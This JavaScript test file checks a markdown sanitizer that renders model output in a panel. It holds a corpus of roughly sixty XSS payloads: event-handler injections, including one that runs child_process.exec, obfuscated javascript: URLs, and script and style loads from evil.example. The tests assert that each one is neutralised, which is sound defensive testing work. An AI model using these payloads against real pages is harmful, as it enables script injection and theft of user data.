// panel/lib/safe-markdown.js turns model output (markdown) into HTML the panel
// can insert without ever running anything. These tests parse the OUTPUT with a
// small strict tokenizer (not a regex over the text) and check it against an
// element/attribute/URL allowlist, for a corpus of hostile-looking inputs, for
// every prefix of each input (the panel re-renders the whole reply on every
// streamed chunk), and for the legitimate markdown that must keep working.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';

const require = createRequire(import.meta.url);
const SafeMarkdown = require(fileURLToPath(new URL('../../lib/safe-markdown.js', import.meta.url)));

// ---- structural checker (independent of the implementation) ----
const ALLOWED = {
  p: [], br: [], strong: [], em: [], del: [], code: ['class'], pre: [], blockquote: [],
  ul: [], ol: ['start'], li: ['class'], a: ['href', 'title', 'rel'], img: ['src', 'alt', 'title'],
  table: [], thead: [], tbody: [], tr: [], th: ['align'], td: ['align'],
  h1: [], h2: [], h3: [], h4: [], h5: [], h6: [], hr: [], input: ['type', 'checked', 'disabled'],
  span: [], div: [],
};
const VOID = new Set(['br', 'hr', 'img', 'input']);
const TAG = /^<(\/?)([a-zA-Z][a-zA-Z0-9]*)((?:\s+[a-zA-Z][a-zA-Z0-9-]*(?:="[^"<>]*")?)*)\s*\/?>/;
const ATTR = /\s+([a-zA-Z][a-zA-Z0-9-]*)(?:="([^"<>]*)")?/g;

function badUrl(name, v, tag) {
  const u = v.replace(/&amp;/g, '&');
  if (/&#?\w+;/.test(u)) return 'entity in url: ' + v;
  if (/[\u0000- \u007f-\u009f"<>`]/.test(u)) return 'control or quote in url: ' + v;
  if (tag === 'img' && /^data:image\/(png|jpeg|gif|webp);base64,[A-Za-z0-9+/=]+$/.test(u)) return null;
  if (/^https?:\/\/[^/?#]/i.test(u)) return null;
  if (tag === 'a' && /^mailto:/i.test(u)) return null;
  return 'scheme not allowed: ' + v;
}

// Returns a list of problems; empty means the markup is inert.
function check(html) {
  const problems = [];
  let i = 0;
  while (i < html.length) {
    const lt = html.indexOf('<', i);
    if (lt === -1) break;
    const m = TAG.exec(html.slice(lt));
    if (!m) { problems.push('stray < at ' + lt + ': ' + html.slice(lt, lt + 40)); i = lt + 1; continue; }
    const tag = m[2].toLowerCase();
    if (!ALLOWED[tag]) problems.push('element not allowed: ' + tag);
    else if (!m[1]) {
      let a; ATTR.lastIndex = 0;
      while ((a = ATTR.exec(m[3]))) {
        const name = a[1].toLowerCase(); const val = a[2] === undefined ? '' : a[2];
        if (name.startsWith('on')) problems.push('event handler: ' + name);
        else if (!ALLOWED[tag].includes(name)) problems.push('attribute not allowed: ' + tag + '@' + name);
        else if (name === 'href' || name === 'src') { const b = badUrl(name, val, tag); if (b) problems.push(b); }
        else if (name === 'class' && !/^(task-item|language-[A-Za-z0-9_+-]+)$/.test(val)) problems.push('class not allowed: ' + val);
        else if (name === 'type' && !(tag === 'input' && val === 'checkbox')) problems.push('type not allowed: ' + val);
        else if (name === 'align' && !/^(left|right|center)$/.test(val)) problems.push('align not allowed: ' + val);
      }
      if (tag === 'input' && !/type="checkbox"/.test(m[3])) problems.push('input without type=checkbox');
    }
    i = lt + m[0].length;
  }
  return problems;
}

// ---- payload corpus ----
const BEACON = 'https://tracker.example/beacon.png?x=1';
const CORPUS = [
  '<img src=x onerror="require(\'child_process\').exec(\'calc\')">',
  '<IMG SRC=x ONERROR=alert(1)>',
  '<svg onload=alert(1)>',
  '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
  '<script>alert(1)</script>',
  '<script src=https://evil.example/x.js></script>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<iframe src="javascript:alert(1)">',
  '<details open ontoggle=alert(1)>x</details>',
  '<a href="javascript:alert(1)">x</a>',
  '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href="  javascript:alert(1)">x</a>',
  '<a href="java\tscript:alert(1)">x</a>',
  '<a href="&#106;avascript:alert(1)">x</a>',
  '[x](javascript:alert(1))',
  '[x](JaVaScRiPt:alert(1))',
  '[x](&#106;avascript:alert(1))',
  '[x](&#x6A;avascript:alert(1))',
  '[x](java&#9;script:alert(1))',
  '[x](vbscript:msgbox(1))',
  '[x](file:///etc/passwd)',
  '[x](//evil.example/x)',
  '[x]( javascript:alert(1))',
  '[x](<javascript:alert(1)>)',
  '[x][r]\n\n[r]: javascript:alert(1)',
  '<javascript:alert(1)>',
  '<data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>',
  '[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
  '![x](' + BEACON + ')',
  '![x](x" onerror=alert(1))',
  '![x](javascript:alert(1))',
  '![x](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)',
  '![x](data:text/html;base64,AAAA)',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  '<style>@import "https://evil.example/x.css"</style>',
  '<form action="https://evil.example"><button>go</button></form>',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<base href="https://evil.example/">',
  '<object data="javascript:alert(1)"></object><embed src="x">',
  '<input type=image src=x onerror=alert(1)>',
  '<input autofocus onfocus=alert(1)>',
  '<textarea><img src=x onerror=alert(1)></textarea>',
  '<!-- --><img src=x onerror=alert(1)>',
  '<p onmouseover="alert(1)">hover</p>',
  '<div style="background:url(javascript:alert(1))">x</div>',
  'text <b onclick=alert(1)>click</b> text',
  '`code` <script>alert(1)</script> **bold**',
  '<pre><script>alert(1)</script></pre>',
  '<code><img src=x onerror=alert(1)></code>',
  '<kbd><img src=x onerror=alert(1)></kbd>',
  '| a | b |\n|---|---|\n| <img src=x onerror=alert(1)> | <svg onload=alert(1)> |',
  '- <img src=x onerror=alert(1)>\n- [ ] <script>alert(1)</script>',
  '> <iframe srcdoc=x>',
  '# <svg onload=alert(1)>',
  '[<img src=x onerror=alert(1)>](https://ok.example)',
  '[x](https://ok.example "t\\" onmouseover=\\"alert(1)")',
  '[x](https://ok.example/"onmouseover="alert(1))',
  '[x](https://ok.example/a b onmouseover=alert(1))',
  '<im' + 'g src=x onerror=alert(1)>',
];

test('corpus is at least 25 payloads', () => { assert.ok(CORPUS.length >= 25); });

test('structural: every payload renders only allowlisted markup', () => {
  for (const p of CORPUS) {
    const out = SafeMarkdown.render(p);
    assert.deepEqual(check(out), [], 'payload ' + JSON.stringify(p) + '\n=> ' + out);
  }
});

test('structural: dangerous text is shown as text, not dropped silently into markup', () => {
  const out = SafeMarkdown.render('<script>alert(1)</script>');
  assert.ok(out.includes('&lt;script&gt;'), out);
  assert.ok(!/<script/i.test(out));
});

test('streaming: no prefix of any payload yields an executable construct', () => {
  for (const p of CORPUS) {
    for (let n = 0; n <= p.length; n++) {
      const out = SafeMarkdown.render(p.slice(0, n));
      const problems = check(out);
      assert.deepEqual(problems, [], 'prefix ' + JSON.stringify(p.slice(0, n)) + '\n=> ' + out);
    }
  }
});

test('streaming: a tag split across two chunks never executes at any render', () => {
  const chunks = [['<im', 'g src=x onerror=alert(1)>'], ['<scr', 'ipt>alert(1)</scr', 'ipt>'], ['[x](java', 'script:alert(1))'], ['<a href="java', 'script:alert(1)">x</a>']];
  for (const parts of chunks) {
    let acc = '';
    for (const c of parts) {
      acc += c;
      assert.deepEqual(check(SafeMarkdown.render(acc)), [], JSON.stringify(acc));
    }
  }
});

test('the filter layer alone neutralises hostile markup handed to it directly', () => {
  for (const p of CORPUS) {
    const out = SafeMarkdown.sanitizeHtml(p);
    assert.deepEqual(check(out), [], 'raw ' + JSON.stringify(p) + '\n=> ' + out);
  }
  const out = SafeMarkdown.sanitizeHtml('<p onclick="x()" class="y">hi</p><a href=\'https://a.example\'>q</a><b>bold</b>');
  assert.deepEqual(check(out), []);
  assert.ok(!/onclick/.test(out));
});

test('the marked renderer layer is safe on its own (the filter is a second layer)', () => {
  for (const p of CORPUS) {
    const out = SafeMarkdown.renderUnfiltered(p);
    assert.deepEqual(check(out), [], 'unfiltered ' + JSON.stringify(p) + '\n=> ' + out);
  }
});

// ---- URL policy ----
test('links: only http, https and mailto get an href; rel is set', () => {
  const ok = SafeMarkdown.render('[a](https://ok.example/p?q=1&r=2) [b](http://ok.example) [c](mailto:me@ok.example)');
  assert.match(ok, /<a href="https:\/\/ok\.example\/p\?q=1&amp;r=2" rel="noopener noreferrer">a<\/a>/);
  assert.match(ok, /<a href="http:\/\/ok\.example" rel="noopener noreferrer">b<\/a>/);
  assert.match(ok, /<a href="mailto:me@ok\.example" rel="noopener noreferrer">c<\/a>/);
  for (const bad of ['javascript:alert(1)', 'JaVaScRiPt:alert(1)', '&#106;avascript:alert(1)', 'vbscript:x', 'file:///etc/passwd', '//evil.example/x', 'data:text/html,hi', 'relative/path', '#frag']) {
    const out = SafeMarkdown.render('[label](' + bad + ')');
    assert.ok(!/<a\b/.test(out), bad + ' => ' + out);
    assert.ok(out.includes('label'), 'link text survives: ' + out);
  }
});

test('images: http, https and base64 raster data URLs only', () => {
  assert.match(SafeMarkdown.render('![alt](https://ok.example/a.png)'), /<img src="https:\/\/ok\.example\/a\.png" alt="alt">/);
  const png = 'data:image/png;base64,iVBORw0KGgo=';
  assert.match(SafeMarkdown.render('![pasted](' + png + ')'), /<img src="data:image\/png;base64,iVBORw0KGgo=" alt="pasted">/);
  for (const bad of ['data:image/svg+xml;base64,PHN2Zz4=', 'data:text/html;base64,AAAA', 'javascript:alert(1)', 'file:///x.png', '//evil.example/a.png', 'data:image/png,notbase64']) {
    const out = SafeMarkdown.render('![alt](' + bad + ')');
    assert.ok(!/<img\b/.test(out), bad + ' => ' + out);
  }
});

test('data: URLs never become link targets', () => {
  assert.ok(!/<a\b/.test(SafeMarkdown.render('[x](data:image/png;base64,iVBORw0KGgo=)')));
});

// ---- legitimate markdown keeps rendering ----
test('legit: fenced code containing script tags is visible text', () => {
  const out = SafeMarkdown.render('```html\n<script>alert(1)</script>\n<img src=x onerror=y>\n```');
  assert.match(out, /<pre><code class="language-html">/);
  assert.ok(out.includes('&lt;script&gt;alert(1)&lt;/script&gt;'), out);
  assert.deepEqual(check(out), []);
});

test('legit: unknown fence language cannot break out of the class attribute', () => {
  const out = SafeMarkdown.render('```js" onclick="x\ncode\n```');
  assert.deepEqual(check(out), [], out);
});

test('legit: inline comparison and angle brackets in prose survive as text', () => {
  const a = SafeMarkdown.render('if a < b and c > d then x <y> z');
  assert.ok(a.includes('a &lt; b'), a);
  assert.ok(a.includes('c &gt; d'), a);
  assert.deepEqual(check(a), []);
  assert.ok(a.includes('&lt;y&gt;'), 'unknown tag shown as text: ' + a);
});

test('legit: emphasis, headings, lists, blockquote, inline code, rules', () => {
  const out = SafeMarkdown.render('# T\n\n**b** *i* ~~d~~ `c`\n\n1. one\n2. two\n\n> q\n\n---\n');
  for (const t of ['<h1>T</h1>', '<strong>b</strong>', '<em>i</em>', '<del>d</del>', '<code>c</code>', '<ol>', '<blockquote>', '<hr>']) assert.ok(out.includes(t), t + ' in ' + out);
  assert.deepEqual(check(out), []);
});

test('legit: GFM tables render with alignment', () => {
  const out = SafeMarkdown.render('| a | b |\n|:--|--:|\n| 1 | 2 |');
  assert.match(out, /<table>/);
  assert.match(out, /<th align="left">a<\/th>/);
  assert.match(out, /<td align="right">2<\/td>/);
  assert.deepEqual(check(out), []);
});

test('legit: task lists keep the task-item class and the disabled checkbox', () => {
  const out = SafeMarkdown.render('- [ ] a\n- [x] b\n- plain');
  assert.equal((out.match(/<li class="task-item">/g) || []).length, 2, out);
  assert.match(out, /<input disabled="" type="checkbox">/);
  assert.match(out, /<input checked="" disabled="" type="checkbox">/);
  assert.match(out, /<li>plain<\/li>/);
  assert.deepEqual(check(out), []);
});

test('legit: list normalisation matches the old renderer (loose lists become tight)', () => {
  const out = SafeMarkdown.render('- a\n\n- b\n\n- c');
  assert.ok(!/<li><p>/.test(out), out);
});

test('legit: autolinked and bracketed URLs still link', () => {
  const out = SafeMarkdown.render('see https://ok.example/x and <https://ok.example/y>');
  assert.equal((out.match(/<a /g) || []).length, 2, out);
});

test('legit: plain text with ampersands and quotes is escaped once', () => {
  const out = SafeMarkdown.render('Tom & "Jerry" <3');
  assert.ok(out.includes('Tom &amp; &quot;Jerry&quot; &lt;3'), out);
});

test('render never throws and returns a string for odd input', () => {
  for (const v of ['', ' ', '\0', '<', '<<<<', '&', '[', '](', '![', '`', '```', '\ud800', 'a'.repeat(5000)]) {
    assert.equal(typeof SafeMarkdown.render(v), 'string');
  }
  assert.equal(SafeMarkdown.render(null), '');
  assert.equal(SafeMarkdown.render(undefined), '');
});

// ---- stored HTML (reply quotes) ----
test('sanitizeHtml keeps ordinary quote markup', () => {
  const html = '<p>hello <strong>there</strong> <code>x</code> <a href="https://ok.example/p?a=1&amp;b=2">link</a></p><ul><li>one</li></ul>';
  const out = SafeMarkdown.sanitizeHtml(html);
  assert.ok(out.includes('<strong>there</strong>'));
  assert.ok(out.includes('<code>x</code>'));
  assert.match(out, /<a href="https:\/\/ok\.example\/p\?a=1&amp;b=2" rel="noopener noreferrer">link<\/a>/);
  assert.deepEqual(check(out), []);
});

test('sanitizeHtml: stored hostile quote html is neutralised', () => {
  const stored = [
    '<img src=x onerror=alert(1)>',
    '<p onclick="x()">a</p><a href="javascript:alert(1)">b</a>',
    '<a href="https://ok.example" onmouseover="x()">c</a>',
    '<svg><script>alert(1)</script></svg>',
    '<img src="https://tracker.example/b.png" onerror="x">',
    '"><img src=x onerror=alert(1)>',
  ];
  for (const s of stored) assert.deepEqual(check(SafeMarkdown.sanitizeHtml(s)), [], s);
  assert.equal(SafeMarkdown.sanitizeHtml(null), '');
  assert.equal(SafeMarkdown.sanitizeHtml(42), '');
});

// ---- helpers the panel uses ----
test('isSafeImageSrc validator for stored thumbnails', () => {
  assert.equal(SafeMarkdown.isSafeImageDataUrl('data:image/jpeg;base64,/9j/4AAQ'), true);
  assert.equal(SafeMarkdown.isSafeImageDataUrl('data:image/svg+xml;base64,AAAA'), false);
  assert.equal(SafeMarkdown.isSafeImageDataUrl('https://x.example/a.png'), false);
  assert.equal(SafeMarkdown.isSafeImageDataUrl(''), false);
  assert.equal(SafeMarkdown.isSafeImageDataUrl(null), false);
});

test('safeSvgIconDataUrl: remote tile icons must be small base64 svg data urls', () => {
  const ok = 'data:image/svg+xml;base64,' + Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"/>').toString('base64');
  assert.equal(SafeMarkdown.safeSvgIconDataUrl(ok), ok);
  assert.equal(SafeMarkdown.safeSvgIconDataUrl('data:image/svg+xml;utf8,<svg onload=x>'), null);
  assert.equal(SafeMarkdown.safeSvgIconDataUrl('data:image/svg+xml;base64,AA"onerror="x'), null);
  assert.equal(SafeMarkdown.safeSvgIconDataUrl('javascript:alert(1)'), null);
  assert.equal(SafeMarkdown.safeSvgIconDataUrl('data:image/svg+xml;base64,' + 'A'.repeat(70000)), null);
  assert.equal(SafeMarkdown.safeSvgIconDataUrl(undefined), null);
});

test('linkTarget: only http(s) URLs may be opened in the system browser', () => {
  assert.equal(SafeMarkdown.externalUrlToOpen('https://ok.example/x'), 'https://ok.example/x');
  assert.equal(SafeMarkdown.externalUrlToOpen('http://ok.example/x'), 'http://ok.example/x');
  for (const bad of ['mailto:a@b.example', 'javascript:alert(1)', 'file:///etc/passwd', '//x.example', '', null, ' https://x.example', 'HTTPS://X.EXAMPLE/a\nb']) {
    assert.equal(SafeMarkdown.externalUrlToOpen(bad), null, String(bad));
  }
});

test('delegated click handler: opens http(s) in the system browser and always blocks in-frame navigation', () => {
  const calls = [];
  const listeners = {};
  const root = { addEventListener(t, fn) { listeners[t] = fn; } };
  SafeMarkdown.attachLinkHandler(root, (u) => calls.push(u));
  assert.equal(typeof listeners.click, 'function');
  const mkEv = (href) => {
    const a = { getAttribute: (n) => (n === 'href' ? href : null) };
    let prevented = false;
    return { target: { closest: (s) => (s === 'a[href]' ? a : null) }, preventDefault() { prevented = true; }, get prevented() { return prevented; } };
  };
  const e1 = mkEv('https://ok.example/a'); listeners.click(e1);
  assert.deepEqual(calls, ['https://ok.example/a']); assert.equal(e1.prevented, true);
  const e2 = mkEv('javascript:alert(1)'); listeners.click(e2);
  assert.deepEqual(calls, ['https://ok.example/a']); assert.equal(e2.prevented, true);
  const e3 = mkEv('mailto:a@b.example'); listeners.click(e3);
  assert.equal(calls.length, 1); assert.equal(e3.prevented, true);
  const e4 = { target: { closest: () => null }, preventDefault() { throw new Error('must not touch non-link clicks'); } };
  listeners.click(e4);
});
